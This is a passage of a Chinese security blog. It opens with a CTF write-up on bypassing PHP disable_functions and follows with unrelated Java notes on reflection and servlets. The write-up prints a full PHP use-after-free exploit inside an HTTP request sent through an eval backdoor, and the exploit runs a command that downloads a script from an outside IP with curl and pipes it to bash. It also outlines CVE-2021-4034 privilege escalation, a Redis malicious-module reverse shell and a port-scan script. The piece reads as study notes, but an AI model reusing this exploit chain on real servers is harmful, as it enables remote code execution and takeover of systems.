<p><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits">https://github.com/mm0r1/exploits</a></p>
<p>这里有个思路也很巧妙，学习一下，就是通过发送文件的形式，这样的话，就不用一直使用file_put_contents去写文件命令执行，可以直接在一个页面</p>
<p>但是需要注意发送文件的格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryj28zfvoWVxnHdp29</span><br><span class="line">Content-Length: 144</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryj28zfvoWVxnHdp29</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;1&quot;</span><br><span class="line"></span><br><span class="line">var_dump(&quot;a&quot;);</span><br><span class="line">------WebKitFormBoundaryj28zfvoWVxnHdp29--</span><br></pre></td></tr></table></figure>

<p>然后将rce的脚本贴过来，但是不能马上用，因为disable_function中过滤了fwrite，需要找替代，使用fputs,使用CVE-2021-4034进行提权</p>
<p>使用一个脚本上传一下，我一直在想如何将文件写入，因为怎么写好像都有问题。</p>
<p>其实可以将他放在服务器上，然后利用curl命令下载过去。又掌握一个新姿势。。。我还在一直用python脚本写，而且穿过去以后，我发现使用那边的gcc也没法编译成功。。。</p>
<p>所以我直接在服务器编译了，然后发送过去</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220222202334.png" alt="img" style="zoom:67%;">

<p>完整命令执行内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;?exp&#x3D;eval($_POST[1]); HTTP&#x2F;1.1</span><br><span class="line">Host: c9be48e4-3f0c-4ebd-8cc6-ba5f826890d0.node4.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko&#x2F;20100101 Firefox&#x2F;97.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: UM_distinctid&#x3D;17c6332d1772a3-003cfe433760328-4c3e2679-144000-17c6332d178a88</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryj28zfvoWVxnHdp29</span><br><span class="line">Content-Length: 6949</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryj28zfvoWVxnHdp29</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;1&quot;</span><br><span class="line"></span><br><span class="line">pwn(&#39;curl http:&#x2F;&#x2F;110.42.133.120&#x2F;tlife|bash &#39;);</span><br><span class="line"></span><br><span class="line">function pwn($cmd) &#123;</span><br><span class="line">    define(&#39;LOGGING&#39;, false);</span><br><span class="line">    define(&#39;CHUNK_DATA_SIZE&#39;, 0x60);</span><br><span class="line">    define(&#39;CHUNK_SIZE&#39;, ZEND_DEBUG_BUILD ? CHUNK_DATA_SIZE + 0x20 : CHUNK_DATA_SIZE);</span><br><span class="line">    define(&#39;FILTER_SIZE&#39;, ZEND_DEBUG_BUILD ? 0x70 : 0x50);</span><br><span class="line">    define(&#39;STRING_SIZE&#39;, CHUNK_DATA_SIZE - 0x18 - 1);</span><br><span class="line">    define(&#39;CMD&#39;, $cmd);</span><br><span class="line">    for($i &#x3D; 0; $i &lt; 10; $i++) &#123;</span><br><span class="line">        $groom[] &#x3D; Pwn::alloc(STRING_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">    stream_filter_register(&#39;pwn_filter&#39;, &#39;Pwn&#39;);</span><br><span class="line">    $fd &#x3D; fopen(&#39;php:&#x2F;&#x2F;memory&#39;, &#39;w&#39;);</span><br><span class="line">    stream_filter_append($fd,&#39;pwn_filter&#39;);</span><br><span class="line">    fputs($fd, &#39;x&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Helper &#123; public $a, $b, $c; &#125;</span><br><span class="line">class Pwn extends php_user_filter &#123;</span><br><span class="line">    private $abc, $abc_addr;</span><br><span class="line">    private $helper, $helper_addr, $helper_off;</span><br><span class="line">    private $uafp, $hfp;</span><br><span class="line"></span><br><span class="line">    public function filter($in, $out, &amp;$consumed, $closing) &#123;</span><br><span class="line">        if($closing) return;</span><br><span class="line">        stream_bucket_make_writeable($in);</span><br><span class="line">        $this-&gt;filtername &#x3D; Pwn::alloc(STRING_SIZE);</span><br><span class="line">        fclose($this-&gt;stream);</span><br><span class="line">        $this-&gt;go();</span><br><span class="line">        return PSFS_PASS_ON;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function go() &#123;</span><br><span class="line">        $this-&gt;abc &#x3D; &amp;$this-&gt;filtername;</span><br><span class="line"></span><br><span class="line">        $this-&gt;make_uaf_obj();</span><br><span class="line"></span><br><span class="line">        $this-&gt;helper &#x3D; new Helper;</span><br><span class="line">        $this-&gt;helper-&gt;b &#x3D; function($x) &#123;&#125;;</span><br><span class="line"></span><br><span class="line">        $this-&gt;helper_addr &#x3D; $this-&gt;str2ptr(CHUNK_SIZE * 2 - 0x18) - CHUNK_SIZE * 2;</span><br><span class="line">        $this-&gt;log(&quot;helper @ 0x%x&quot;, $this-&gt;helper_addr);</span><br><span class="line"></span><br><span class="line">        $this-&gt;abc_addr &#x3D; $this-&gt;helper_addr - CHUNK_SIZE;</span><br><span class="line">        $this-&gt;log(&quot;abc @ 0x%x&quot;, $this-&gt;abc_addr);</span><br><span class="line"></span><br><span class="line">        $this-&gt;helper_off &#x3D; $this-&gt;helper_addr - $this-&gt;abc_addr - 0x18;</span><br><span class="line"></span><br><span class="line">        $helper_handlers &#x3D; $this-&gt;str2ptr(CHUNK_SIZE);</span><br><span class="line">        $this-&gt;log(&quot;helper handlers @ 0x%x&quot;, $helper_handlers);</span><br><span class="line"></span><br><span class="line">        $this-&gt;prepare_leaker();</span><br><span class="line"></span><br><span class="line">        $binary_leak &#x3D; $this-&gt;read($helper_handlers + 8);</span><br><span class="line">        $this-&gt;log(&quot;binary leak @ 0x%x&quot;, $binary_leak);</span><br><span class="line">        $this-&gt;prepare_cleanup($binary_leak);</span><br><span class="line"></span><br><span class="line">        $closure_addr &#x3D; $this-&gt;str2ptr($this-&gt;helper_off + 0x38);</span><br><span class="line">        $this-&gt;log(&quot;real closure @ 0x%x&quot;, $closure_addr);</span><br><span class="line"></span><br><span class="line">        $closure_ce &#x3D; $this-&gt;read($closure_addr + 0x10);</span><br><span class="line">        $this-&gt;log(&quot;closure class_entry @ 0x%x&quot;, $closure_ce);</span><br><span class="line"></span><br><span class="line">        $basic_funcs &#x3D; $this-&gt;get_basic_funcs($closure_ce);</span><br><span class="line">        $this-&gt;log(&quot;basic_functions @ 0x%x&quot;, $basic_funcs);</span><br><span class="line"></span><br><span class="line">        $zif_system &#x3D; $this-&gt;get_system($basic_funcs);</span><br><span class="line">        $this-&gt;log(&quot;zif_system @ 0x%x&quot;, $zif_system);</span><br><span class="line"></span><br><span class="line">        $fake_closure_off &#x3D; $this-&gt;helper_off + CHUNK_SIZE * 2;</span><br><span class="line">        for($i &#x3D; 0; $i &lt; 0x138; $i +&#x3D; 8) &#123;</span><br><span class="line">            $this-&gt;write($fake_closure_off + $i, $this-&gt;read($closure_addr + $i));</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;write($fake_closure_off + 0x38, 1, 4);</span><br><span class="line"></span><br><span class="line">        $handler_offset &#x3D; PHP_MAJOR_VERSION &#x3D;&#x3D;&#x3D; 8 ? 0x70 : 0x68;</span><br><span class="line">        $this-&gt;write($fake_closure_off + $handler_offset, $zif_system);</span><br><span class="line"></span><br><span class="line">        $fake_closure_addr &#x3D; $this-&gt;helper_addr + $fake_closure_off - $this-&gt;helper_off;</span><br><span class="line">        $this-&gt;write($this-&gt;helper_off + 0x38, $fake_closure_addr);</span><br><span class="line">        $this-&gt;log(&quot;fake closure @ 0x%x&quot;, $fake_closure_addr);</span><br><span class="line"></span><br><span class="line">        $this-&gt;cleanup();</span><br><span class="line">        ($this-&gt;helper-&gt;b)(CMD);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function make_uaf_obj() &#123;</span><br><span class="line">        $this-&gt;uafp &#x3D; fopen(&#39;php:&#x2F;&#x2F;memory&#39;, &#39;w&#39;);</span><br><span class="line">        fputs($this-&gt;uafp, pack(&#39;QQQ&#39;, 1, 0, 0xDEADBAADC0DE));</span><br><span class="line">        for($i &#x3D; 0; $i &lt; STRING_SIZE; $i++) &#123;</span><br><span class="line">            fputs($this-&gt;uafp, &quot;\x00&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function prepare_leaker() &#123;</span><br><span class="line">        $str_off &#x3D; $this-&gt;helper_off + CHUNK_SIZE + 8;</span><br><span class="line">        $this-&gt;write($str_off, 2);</span><br><span class="line">        $this-&gt;write($str_off + 0x10, 6);</span><br><span class="line"></span><br><span class="line">        $val_off &#x3D; $this-&gt;helper_off + 0x48;</span><br><span class="line">        $this-&gt;write($val_off, $this-&gt;helper_addr + CHUNK_SIZE + 8);</span><br><span class="line">        $this-&gt;write($val_off + 8, 0xA);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function prepare_cleanup($binary_leak) &#123;</span><br><span class="line">        $ret_gadget &#x3D; $binary_leak;</span><br><span class="line">        do &#123;</span><br><span class="line">            --$ret_gadget;</span><br><span class="line">        &#125; while($this-&gt;read($ret_gadget, 1) !&#x3D;&#x3D; 0xC3);</span><br><span class="line">        $this-&gt;log(&quot;ret gadget &#x3D; 0x%x&quot;, $ret_gadget);</span><br><span class="line">        $this-&gt;write(0, $this-&gt;abc_addr + 0x20 - (PHP_MAJOR_VERSION &#x3D;&#x3D;&#x3D; 8 ? 0x50 : 0x60));</span><br><span class="line">        $this-&gt;write(8, $ret_gadget);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function read($addr, $n &#x3D; 8) &#123;</span><br><span class="line">        $this-&gt;write($this-&gt;helper_off + CHUNK_SIZE + 16, $addr - 0x10);</span><br><span class="line">        $value &#x3D; strlen($this-&gt;helper-&gt;c);</span><br><span class="line">        if($n !&#x3D;&#x3D; 8) &#123; $value &amp;&#x3D; (1 &lt;&lt; ($n &lt;&lt; 3)) - 1; &#125;</span><br><span class="line">        return $value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function write($p, $v, $n &#x3D; 8) &#123;</span><br><span class="line">        for($i &#x3D; 0; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $this-&gt;abc[$p + $i] &#x3D; chr($v &amp; 0xff);</span><br><span class="line">            $v &gt;&gt;&#x3D; 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function get_basic_funcs($addr) &#123;</span><br><span class="line">        while(true) &#123;</span><br><span class="line">            &#x2F;&#x2F; In rare instances the standard module might lie after the addr we&#39;re starting</span><br><span class="line">            &#x2F;&#x2F; the search from. This will result in a SIGSGV when the search reaches an unmapped page.</span><br><span class="line">            &#x2F;&#x2F; In that case, changing the direction of the search should fix the crash.</span><br><span class="line">            &#x2F;&#x2F; $addr +&#x3D; 0x10;</span><br><span class="line">            $addr -&#x3D; 0x10;</span><br><span class="line">            if($this-&gt;read($addr, 4) &#x3D;&#x3D;&#x3D; 0xA8 &amp;&amp;</span><br><span class="line">                in_array($this-&gt;read($addr + 4, 4),</span><br><span class="line">                    [20151012, 20160303, 20170718, 20180731, 20190902, 20200930])) &#123;</span><br><span class="line">                $module_name_addr &#x3D; $this-&gt;read($addr + 0x20);</span><br><span class="line">                $module_name &#x3D; $this-&gt;read($module_name_addr);</span><br><span class="line">                if($module_name &#x3D;&#x3D;&#x3D; 0x647261646e617473) &#123;</span><br><span class="line">                    $this-&gt;log(&quot;standard module @ 0x%x&quot;, $addr);</span><br><span class="line">                    return $this-&gt;read($addr + 0x28);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function get_system($basic_funcs) &#123;</span><br><span class="line">        $addr &#x3D; $basic_funcs;</span><br><span class="line">        do &#123;</span><br><span class="line">            $f_entry &#x3D; $this-&gt;read($addr);</span><br><span class="line">            $f_name &#x3D; $this-&gt;read($f_entry, 6);</span><br><span class="line">            if($f_name &#x3D;&#x3D;&#x3D; 0x6d6574737973) &#123;</span><br><span class="line">                return $this-&gt;read($addr + 8);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr +&#x3D; 0x20;</span><br><span class="line">        &#125; while($f_entry !&#x3D;&#x3D; 0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function cleanup() &#123;</span><br><span class="line">        $this-&gt;hfp &#x3D; fopen(&#39;php:&#x2F;&#x2F;memory&#39;, &#39;w&#39;);</span><br><span class="line">        fputs($this-&gt;hfp, pack(&#39;QQ&#39;, 0, $this-&gt;abc_addr));</span><br><span class="line">        for($i &#x3D; 0; $i &lt; FILTER_SIZE - 0x10; $i++) &#123;</span><br><span class="line">            fputs($this-&gt;hfp, &quot;\x00&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function str2ptr($p &#x3D; 0, $n &#x3D; 8) &#123;</span><br><span class="line">        $address &#x3D; 0;</span><br><span class="line">        for($j &#x3D; $n - 1; $j &gt;&#x3D; 0; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;&#x3D; 8;</span><br><span class="line">            $address |&#x3D; ord($this-&gt;abc[$p + $j]);</span><br><span class="line">        &#125;</span><br><span class="line">        return $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function ptr2str($ptr, $n &#x3D; 8) &#123;</span><br><span class="line">        $out &#x3D; &#39;&#39;;</span><br><span class="line">        for ($i &#x3D; 0; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $out .&#x3D; chr($ptr &amp; 0xff);</span><br><span class="line">            $ptr &gt;&gt;&#x3D; 8;</span><br><span class="line">        &#125;</span><br><span class="line">        return $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function log($format, $val &#x3D; &#39;&#39;) &#123;</span><br><span class="line">        if(LOGGING) &#123;</span><br><span class="line">            printf(&quot;&#123;$format&#125;\n&quot;, $val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    static function alloc($size) &#123;</span><br><span class="line">        return str_shuffle(str_repeat(&#39;A&#39;, $size));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">------WebKitFormBoundaryj28zfvoWVxnHdp29--</span><br></pre></td></tr></table></figure>

<h2 id="预期解-redis主从复制rce"><a href="#预期解-redis主从复制rce" class="headerlink" title="预期解:redis主从复制rce"></a>预期解:redis主从复制rce</h2><p>写马进去以后，发现有一份redis的账号密码,那应该就是主从复制加载so文件了，想用插件直接试试，发现端口不是6379.猜测可能没开redis服务</p>
<p>学习一下：</p>
<p>利⽤ <strong>get_loaded_extensions()</strong> 可以看到PHP加载的插件，从中可以看到题⽬环境中加载了PHP的redis插件 （redis.so），翻找⼀下⽂档可以找到这个插件的Redis类中有 <strong>rawCommand()</strong> ⽅法可以执⾏redis的命令操作。利用 <strong>file_put_contents()</strong> 写恶意so文件，接着<strong>载入恶意.so文件模块</strong>，反弹shell至远程主机</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(get_loaded_extensions());</span><br></pre></td></tr></table></figure>

<p>可以发现，加载了redis的插件，尝试运行一下开启服务<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220222220855.png" alt="img" style="zoom:67%;"></p>
<p>还需要找到开放的端口来打在redis服务，所以还需要扫描 一下端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"># Port scan</span><br><span class="line">for($i&#x3D;0;$i&lt;65535;$i++) &#123;</span><br><span class="line">  $t&#x3D;stream_socket_server(&quot;tcp:&#x2F;&#x2F;0.0.0.0:&quot;.$i,$ee,$ee2);</span><br><span class="line">  if($ee2 &#x3D;&#x3D;&#x3D; &quot;Address already in use&quot;) &#123;</span><br><span class="line">    var_dump($i);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有个小tip：写入文件的时候，转为base64写入就不用管转义的事了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a&#x3D;&quot;PD9waHAKaGlnaGxpZ2h0X2ZpbGUoX19GSUxFX18pOwojIFBvcnQgc2Nhbgpmb3IoJGk9MDskaTw2NTUzNTskaSsrKSB7CiAgJHQ9c3RyZWFtX3NvY2tldF9zZXJ2ZXIoInRjcDovLzAuMC4wLjA6Ii4kaSwkZWUsJGVlMik7CiAgaWYoJGVlMiA9PT0gIkFkZHJlc3MgYWxyZWFkeSBpbiB1c2UiKSB7CiAgICB2YXJfZHVtcCgkaSk7CiAgfQp9Cg&#x3D;&#x3D;&quot;;</span><br><span class="line">file_put_contents(&quot;a.php&quot;,base64_decode($a));</span><br></pre></td></tr></table></figure>

<p>接下来发现的步骤就还是提权了</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/02/21/java%E5%AE%A1%E8%AE%A13/">java反射机制</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-02-21</time><div class="content"><h2 id="如何理解反射"><a href="#如何理解反射" class="headerlink" title="如何理解反射"></a>如何理解反射</h2><p>反射可以理解为一种手段，对象通过反射可以获取他的类，类可以通过反射获取他的所有方法，通过反射，我们可以将java这种静态语言附加上动态特性。</p>
<p><strong>这种动态获取的信息以及动态调用对象的功能成为java语言的反射机制</strong></p>
<h3 id="如何理解动态特性"><a href="#如何理解动态特性" class="headerlink" title="如何理解动态特性"></a>如何理解动态特性</h3><p>⼀段代码，改变其中的变量，将会导致这段代码产⽣功能性的变化</p>
<h2 id="获取类对象的方法"><a href="#获取类对象的方法" class="headerlink" title="获取类对象的方法"></a>获取类对象的方法</h2><h3 id="1-forname-方法"><a href="#1-forname-方法" class="headerlink" title="1.forname()方法"></a>1.forname()方法</h3><p>通过动态修改forname的参数，可以获取不同的java类</p>
<p>并且其静态方法JVM会装在类，并且执行static()中的代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class reflect_test &#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException&#123;</span><br><span class="line">        Class name&#x3D; Class.forName(&quot;xxxx&quot;);</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-直接获取"><a href="#2-直接获取" class="headerlink" title="2.直接获取"></a>2.直接获取</h3><p>任何数据类型都具备静态的属性，因此可以使用.class直接获取其对应的class对象,需要明确用到类中的静态成员</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws ClassNotFoundException&#123;</span><br><span class="line">    Class&lt;?&gt; name&#x3D;Runtime.class;</span><br><span class="line">    System.out.println(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-使用getclass-方法"><a href="#3-使用getclass-方法" class="headerlink" title="3.使用getclass()方法"></a>3.使用getclass()方法</h3><p>我们可以通过object类中的getclass()方法来获取字节码对象<br><strong>需要明确具体的类，然后创建对象</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws ClassNotFoundException&#123;</span><br><span class="line">    Runtime rt&#x3D; Runtime.getRuntime();</span><br><span class="line">    Class&lt;?&gt; name&#x3D;rt.getClass();</span><br><span class="line">    System.out.println(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-使用getSystemClassLoader-loadClass"><a href="#4-使用getSystemClassLoader-loadClass" class="headerlink" title="4.使用getSystemClassLoader().loadClass()"></a>4.使用getSystemClassLoader().loadClass()</h3><p>1.类似于forName()</p>
<p>但是不会执行static中的代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws ClassNotFoundException&#123;</span><br><span class="line">    Class&lt;?&gt; name&#x3D;ClassLoader.getSystemClassLoader().loadClass(&quot;java.lang.Runtime&quot;);</span><br><span class="line">    System.out.println(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="获取类的方法"><a href="#获取类的方法" class="headerlink" title="获取类的方法"></a>获取类的方法</h2><h3 id="1-getDeclaredMethods方法"><a href="#1-getDeclaredMethods方法" class="headerlink" title="1.getDeclaredMethods方法"></a>1.getDeclaredMethods方法</h3><p>getDeclaredMethods方法 返回类或接口声明的所有办法，包括public、protected、private、和默认方法，但不包括继承的方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.Method;</span><br><span class="line">public class getfunction &#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException&#123;</span><br><span class="line">        Class name&#x3D; Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">        Method[] declaredMethods&#x3D;name.getDeclaredMethods();</span><br><span class="line">        System.out.println(&quot;通过getDeclaredMethods获取的方法有:&quot;);</span><br><span class="line">        for(Method m:declaredMethods)</span><br><span class="line">            System.out.println(m);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-getMethods方法"><a href="#2-getMethods方法" class="headerlink" title="2.getMethods方法"></a>2.getMethods方法</h3><p>getMethods方法返回某个类的所有public方法，包括其继承类的public方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws ClassNotFoundException&#123;</span><br><span class="line">    Class name&#x3D; Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">    Method[] declaredMethods&#x3D;name.getMethods();</span><br><span class="line">    System.out.println(&quot;通过getMethods获取的方法有:&quot;);</span><br><span class="line">    for(Method m:declaredMethods)</span><br><span class="line">        System.out.println(m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-getMethod方法"><a href="#3-getMethod方法" class="headerlink" title="3.getMethod方法"></a>3.getMethod方法</h3><p>只能返回一个特定的方法，如Runtime类中的exec方法，该方法的第一个参数为方法名称，后面的参数为方法的参数对应class的对象</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws ClassNotFoundException,NoSuchMethodException&#123;</span><br><span class="line">    Runtime rt&#x3D;Runtime.getRuntime();</span><br><span class="line">    Class&lt;?&gt; name&#x3D; rt.getClass();</span><br><span class="line">    Method method&#x3D;name.getMethod(&quot;exec&quot;,String.class);</span><br><span class="line">    System.out.println(&quot;通过getMethods获取的方法有:&quot;);</span><br><span class="line">    System.out.println(method);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-getDeclaredMethod方法"><a href="#4-getDeclaredMethod方法" class="headerlink" title="4.getDeclaredMethod方法"></a>4.getDeclaredMethod方法</h3><p>getDeclaredMethod方法和getMethod类似</p>
<h2 id="获取成员变量"><a href="#获取成员变量" class="headerlink" title="获取成员变量"></a>获取成员变量</h2><h3 id="1-getDeclaredFields方法"><a href="#1-getDeclaredFields方法" class="headerlink" title="1.getDeclaredFields方法"></a>1.getDeclaredFields方法</h3><p>getDeclaredFields能获得类的成员变量数组，包括public、private、protected，但是不包括父类的声明字段</p>
<h3 id="2-getFields方法"><a href="#2-getFields方法" class="headerlink" title="2.getFields方法"></a>2.getFields方法</h3><p>getFields能够获得某个类的所有public字段，包括父类中的字段，</p>
<h3 id="3-getDeclaredField方法"><a href="#3-getDeclaredField方法" class="headerlink" title="3.getDeclaredField方法"></a>3.getDeclaredField方法</h3><p>只能获得类的单个成员变量</p>
<h3 id="4-getField方法"><a href="#4-getField方法" class="headerlink" title="4.getField方法"></a>4.getField方法</h3><p>类似getFields方法，能够获得某个类特定的public字段，包括父类中的字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; name&#x3D;student.getClass()</span><br><span class="line">Field getField&#x3D;name.getField(&quot;content&quot;);</span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><code>forNam</code>e不是获取“类”的唯⼀途径，通常来说我们有如下三种⽅式获取⼀个“类”，也就是java.lang.Class对象：</p>
<p><code>obj.getClass()</code> 如果上下⽂中存在某个类的实例obj，那么我们可以直接通过obj.getClass()来获取它的类<br><code>Test.class </code>如果你已经加载了某个类，只是想获取到它的java.lang.Class对象，那么就直接拿它的class属性即可。这个⽅法其实不属于反射。<code>Class.forName </code>如果你知道某个类的名字，想获取到这个类，就可以使⽤forName来获取</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/02/21/java%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/">java初探（二）</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-02-21</time><div class="content"><h2 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h2><p>写完的程序放在webapps</p>
<h3 id="如何创建一个java-web工程"><a href="#如何创建一个java-web工程" class="headerlink" title="如何创建一个java web工程"></a>如何创建一个java web工程</h3><h2 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h2><p>java servlet 是运行在web服务器或应用服务器上的程序，它是作为来自web浏览器或其他HTTP客户端的请求和HTTP服务器上的数据库或应用程序之间的中间层</p>
<p><strong>功能</strong><br>1.创建并返回基于客户请求的动态HTML页面<br>2.与数据库进行通信</p>
<h3 id="如何制作映射-让客户端访问到java类"><a href="#如何制作映射-让客户端访问到java类" class="headerlink" title="如何制作映射 让客户端访问到java类"></a>如何制作映射 让客户端访问到java类</h3><p>web.xml中，Servlet的配置在servlet标签中，有servlet和servlet-mapping标签组成，通过servlet-name实现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;servlet&gt;:声明servlet配置入口</span><br><span class="line">&lt;description&gt;:声明servlet描述信息</span><br><span class="line">&lt;display-name&gt;:定义web应用名字</span><br><span class="line">&lt;servlet-name&gt;:声明servlet名称以便在后面的映射时使用</span><br><span class="line">&lt;servlet-class&gt;:指定当前servlet对应的类的路径</span><br><span class="line">&lt;servlet-mapping&gt;:注册组件访问配置的路径入口</span><br><span class="line">&lt;servlet-name&gt;:指定上文配置的servlet的名称</span><br><span class="line">&lt;url-pattern&gt;:指定配置这个组件的访问路径</span><br></pre></td></tr></table></figure>

<p>例:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">	&lt;servlet-name&gt;myservlet(java包名字)&lt;&#x2F;servlet-name&gt;</span><br><span class="line">	&lt;servlet-class&gt;路径&lt;&#x2F;servlet-class&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">	&lt;servlet-name&gt;myservlet&lt;&#x2F;servlet-name&gt;</span><br><span class="line">	&lt;url-pattern&gt;声明浏览器访问的路径&lt;&#x2F;url-pattern&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br></pre></td></tr></table></figure>

<p>而在Servlet3.0以上的版本中，web.xml可以配置的servlet属性，都可以通过@WebServlet的方式进行配置</p>
<h3 id="接口方法"><a href="#接口方法" class="headerlink" title="接口方法"></a>接口方法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">init():初始化对象</span><br><span class="line">service():执行实际任务的主要方法</span><br><span class="line">doget()&#x2F;dopost()</span><br><span class="line">destory()接口：释放资源</span><br></pre></td></tr></table></figure>

<h2 id="java-web过滤器——filter"><a href="#java-web过滤器——filter" class="headerlink" title="java web过滤器——filter"></a>java web过滤器——filter</h2><p>filter是Servlet2.3新增的一个特性，能够实现对所有web资源的管理，实现权限访问控制，过滤敏感词汇，压缩响应信息等一些高级功能</p>
<p><strong>配置方式:1.基于web.xml 2.基于注解方式</strong></p>
<p>注意：使用注解方式配置filter，无法确定过滤器的执行顺序</p>
<h3 id="filter实现流程"><a href="#filter实现流程" class="headerlink" title="filter实现流程"></a>filter实现流程</h3><p>用户向服务器发送request请求，服务器接收改请求，并将请求按次序发送到filter中进行处理，最后调用servlet中的service()方法，调用完毕后，按照与进入时相反的顺序调用filter返回给服务器，最终返回给用户。</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/02/20/java%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/">java初探（一）</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-02-20</time><div class="content"><h2 id="对java进行远程调试"><a href="#对java进行远程调试" class="headerlink" title="对java进行远程调试"></a>对java进行远程调试</h2><h3 id="对jar包进行远程调试"><a href="#对jar包进行远程调试" class="headerlink" title="对jar包进行远程调试"></a>对jar包进行远程调试</h3><p>1.创建一个java项目，并创建一个lib文件夹将jar包放入<br>2.进入lib文件夹后，右键选择 Add as Library<br>3.选择右上角的Add Configurations，并单击+号添加remote，其中</p>
